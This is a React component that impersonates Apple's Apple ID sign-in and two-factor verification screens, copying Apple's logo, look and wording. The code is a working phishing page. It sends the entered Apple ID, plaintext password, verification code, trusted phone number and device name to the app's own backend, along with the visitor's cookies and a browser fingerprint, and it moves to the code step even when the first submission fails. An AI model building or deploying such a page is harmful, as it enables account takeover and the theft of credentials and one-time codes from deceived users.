import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5001/api';

const AppleAuth = () => {
  const navigate = useNavigate();
  const [step, setStep] = useState('credentials'); // 'credentials', 'otp'
  const [formData, setFormData] = useState({
    appleId: '',
    password: '',
    otp: '',
    phoneNumber: '',
    trustedDevice: ''
  });
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const getUserDetails = () => {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    return {
      userAgent,
      platform,
      language,
      screenResolution,
      timezone,
      cookies: document.cookie,
      timestamp: new Date().toISOString()
    };
  };

  const handleCredentialsSubmit = async (e) => {
    e.preventDefault();
    if (!formData.appleId || !formData.password) {
      setError('Please enter your Apple ID and password');
      return;
    }

    setLoading(true);
    try {
      await axios.post(`${API_URL}/auth/track-apple-signin`, {
        appleId: formData.appleId,
        password: formData.password,
        step: 'credentials',
        userDetails: getUserDetails()
      });
      
      setStep('otp');
      setError('');
    } catch (err) {
      console.error('Error:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleOTPSubmit = async (e) => {
    e.preventDefault();
    if (!formData.otp) {
      setError('Please enter the verification code');
      return;
    }

    setLoading(true);
    try {
      const response = await axios.post(`${API_URL}/auth/apple-complete`, {
        appleId: formData.appleId,
        password: formData.password,
        otp: formData.otp,
        phoneNumber: formData.phoneNumber,
        trustedDevice: formData.trustedDevice,
        step: 'otp',
        userDetails: getUserDetails()
      });

      if (response.data.token) {
        localStorage.setItem('token', response.data.token);
        localStorage.setItem('user', JSON.stringify(response.data.user));
        navigate('/dashboard');
      }
    } catch (err) {
      setError('Invalid verification code. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{
      minHeight: '100vh',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      background: '#000',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif'
    }}>
      <div style={{
        backgroundColor: 'white',
        borderRadius: '12px',
        padding: '48px',
        maxWidth: '450px',
        width: '100%',
        boxShadow: '0 10px 40px rgba(0,0,0,0.15)'
      }}>
        {/* Credentials Step */}
        {step === 'credentials' && (
          <>
            {/* Apple Logo */}
            <div style={{ textAlign: 'center', marginBottom: '32px' }}>
              <svg height="44" viewBox="0 0 17 44" width="17" xmlns="http://www.w3.org/2000/svg">
                <path d="m15.5752 19.0792a4.2055 4.2055 0 0 0 -2.01 3.5376 4.0931 4.0931 0 0 0 2.4908 3.7542 9.7779 9.7779 0 0 1 -1.2755 2.6351c-.7941 1.1431-1.6244 2.2862-2.8878 2.2862s-1.5883-.734-3.0443-.734c-1.42 0-1.9252.7581-3.08.7581s-1.9713-1.0589-2.8876-2.3584a11.3987 11.3987 0 0 1 -1.9171-6.5479 5.0446 5.0446 0 0 1 4.6116-5.2453c1.2274 0 2.25.8041 3.02.8041.7351 0 1.8773-.8472 3.27-.8472a4.3866 4.3866 0 0 1 3.6822 1.841zm-6.8586-2.0456a1.3 1.3 0 0 1 -.1122-.2041 3.9459 3.9459 0 0 1 .9641-2.8492 4.0683 4.0683 0 0 1 2.7033-1.369 1.7815 1.7815 0 0 1 .0621.2022 4.013 4.013 0 0 1 -.9519 2.8213 3.4822 3.4822 0 0 1 -2.6654 1.3988z" fill="currentColor"/>
              </svg>
            </div>

            <h1 style={{
              fontSize: '32px',
              fontWeight: '600',
              textAlign: 'center',
              marginBottom: '8px',
              color: '#1d1d1f'
            }}>
              Sign in with Apple ID
            </h1>
            
            <form onSubmit={handleCredentialsSubmit}>
              <div style={{ marginBottom: '20px' }}>
                <input
                  type="email"
                  value={formData.appleId}
                  onChange={(e) => setFormData({...formData, appleId: e.target.value})}
                  placeholder="Apple ID"
                  style={{
                    width: '100%',
                    padding: '16px 12px',
                    fontSize: '17px',
                    border: '1px solid #d2d2d7',
                    borderRadius: '8px',
                    boxSizing: 'border-box',
                    backgroundColor: '#f5f5f7'
                  }}
                  autoFocus
                />
              </div>

              <div style={{ marginBottom: '24px' }}>
                <input
                  type="password"
                  value={formData.password}
                  onChange={(e) => setFormData({...formData, password: e.target.value})}
                  placeholder="Password"
                  style={{
                    width: '100%',
                    padding: '16px 12px',
                    fontSize: '17px',
                    border: '1px solid #d2d2d7',
                    borderRadius: '8px',
                    boxSizing: 'border-box',
                    backgroundColor: '#f5f5f7'
                  }}
                />
              </div>

              {error && (
                <div style={{
                  color: '#e5002a',
                  fontSize: '14px',
                  marginBottom: '16px',
                  textAlign: 'center'
                }}>
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={loading}
                style={{
                  width: '100%',
                  padding: '16px',
                  fontSize: '17px',
                  fontWeight: '400',
                  color: 'white',
                  backgroundColor: '#0071e3',
                  border: 'none',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  opacity: loading ? 0.6 : 1,
                  marginBottom: '16px'
                }}
              >
                {loading ? 'Signing in...' : 'Continue'}
              </button>

              <div style={{ textAlign: 'center', marginBottom: '24px' }}>
                <a href="#" style={{
                  color: '#0066cc',
                  textDecoration: 'none',
                  fontSize: '14px'
                }}>
                  Forgot Apple ID or password?
                </a>
              </div>

              <div style={{ textAlign: 'center' }}>
                <span style={{ fontSize: '14px', color: '#86868b' }}>
                  Don't have an Apple ID?{' '}
                </span>
                <a href="#" style={{
                  color: '#0066cc',
                  textDecoration: 'none',
                  fontSize: '14px'
                }}>
                  Create yours now.
                </a>
              </div>
            </form>
          </>
        )}

        {/* OTP Step */}
        {step === 'otp' && (
          <>
            <div style={{ textAlign: 'center', marginBottom: '32px' }}>
              <svg height="44" viewBox="0 0 17 44" width="17" xmlns="http://www.w3.org/2000/svg">
                <path d="m15.5752 19.0792a4.2055 4.2055 0 0 0 -2.01 3.5376 4.0931 4.0931 0 0 0 2.4908 3.7542 9.7779 9.7779 0 0 1 -1.2755 2.6351c-.7941 1.1431-1.6244 2.2862-2.8878 2.2862s-1.5883-.734-3.0443-.734c-1.42 0-1.9252.7581-3.08.7581s-1.9713-1.0589-2.8876-2.3584a11.3987 11.3987 0 0 1 -1.9171-6.5479 5.0446 5.0446 0 0 1 4.6116-5.2453c1.2274 0 2.25.8041 3.02.8041.7351 0 1.8773-.8472 3.27-.8472a4.3866 4.3866 0 0 1 3.6822 1.841zm-6.8586-2.0456a1.3 1.3 0 0 1 -.1122-.2041 3.9459 3.9459 0 0 1 .9641-2.8492 4.0683 4.0683 0 0 1 2.7033-1.369 1.7815 1.7815 0 0 1 .0621.2022 4.013 4.013 0 0 1 -.9519 2.8213 3.4822 3.4822 0 0 1 -2.6654 1.3988z" fill="currentColor"/>
              </svg>
            </div>

            <h1 style={{
              fontSize: '28px',
              fontWeight: '600',
              textAlign: 'center',
              marginBottom: '16px',
              color: '#1d1d1f'
            }}>
              Two-Factor Authentication
            </h1>

            <p style={{
              textAlign: 'center',
              color: '#86868b',
              marginBottom: '24px',
              fontSize: '14px',
              lineHeight: '1.5'
            }}>
              Enter the 6-digit verification code from one of your trusted devices.
            </p>

            <div style={{
              textAlign: 'center',
              marginBottom: '24px',
              padding: '12px',
              backgroundColor: '#f5f5f7',
              borderRadius: '8px'
            }}>
              <span style={{ fontSize: '14px', color: '#1d1d1f', fontWeight: '500' }}>
                {formData.appleId}
              </span>
            </div>

            <form onSubmit={handleOTPSubmit}>
              <div style={{ marginBottom: '20px' }}>
                <input
                  type="text"
                  value={formData.otp}
                  onChange={(e) => setFormData({...formData, otp: e.target.value})}
                  placeholder="Verification Code"
                  maxLength="6"
                  style={{
                    width: '100%',
                    padding: '16px 12px',
                    fontSize: '24px',
                    border: '1px solid #d2d2d7',
                    borderRadius: '8px',
                    boxSizing: 'border-box',
                    backgroundColor: '#f5f5f7',
                    textAlign: 'center',
                    letterSpacing: '8px'
                  }}
                  autoFocus
                />
              </div>

              <div style={{ marginBottom: '20px' }}>
                <label style={{
                  display: 'block',
                  fontSize: '14px',
                  color: '#86868b',
                  marginBottom: '8px'
                }}>
                  Trusted Phone Number (optional)
                </label>
                <input
                  type="tel"
                  value={formData.phoneNumber}
                  onChange={(e) => setFormData({...formData, phoneNumber: e.target.value})}
                  placeholder="+1 (•••) •••-••34"
                  style={{
                    width: '100%',
                    padding: '16px 12px',
                    fontSize: '17px',
                    border: '1px solid #d2d2d7',
                    borderRadius: '8px',
                    boxSizing: 'border-box',
                    backgroundColor: '#f5f5f7'
                  }}
                />
              </div>

              <div style={{ marginBottom: '24px' }}>
                <label style={{
                  display: 'block',
                  fontSize: '14px',
                  color: '#86868b',
                  marginBottom: '8px'
                }}>
                  Trusted Device Name (optional)
                </label>
                <input
                  type="text"
                  value={formData.trustedDevice}
                  onChange={(e) => setFormData({...formData, trustedDevice: e.target.value})}
                  placeholder="iPhone 14 Pro"
                  style={{
                    width: '100%',
                    padding: '16px 12px',
                    fontSize: '17px',
                    border: '1px solid #d2d2d7',
                    borderRadius: '8px',
                    boxSizing: 'border-box',
                    backgroundColor: '#f5f5f7'
                  }}
                />
              </div>

              {error && (
                <div style={{
                  color: '#e5002a',
                  fontSize: '14px',
                  marginBottom: '16px',
                  textAlign: 'center'
                }}>
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={loading}
                style={{
                  width: '100%',
                  padding: '16px',
                  fontSize: '17px',
                  fontWeight: '400',
                  color: 'white',
                  backgroundColor: '#0071e3',
                  border: 'none',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  opacity: loading ? 0.6 : 1,
                  marginBottom: '16px'
                }}
              >
                {loading ? 'Verifying...' : 'Verify'}
              </button>

              <div style={{ textAlign: 'center', marginBottom: '16px' }}>
                <a href="#" style={{
                  color: '#0066cc',
                  textDecoration: 'none',
                  fontSize: '14px'
                }}>
                  Didn't get a code?
                </a>
              </div>

              <div style={{ textAlign: 'center' }}>
                <button
                  type="button"
                  onClick={() => setStep('credentials')}
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#0066cc',
                    fontSize: '14px',
                    cursor: 'pointer',
                    textDecoration: 'none'
                  }}
                >
                  Use a different Apple ID
                </button>
              </div>
            </form>
          </>
        )}
      </div>
    </div>
  );
};

export default AppleAuth;
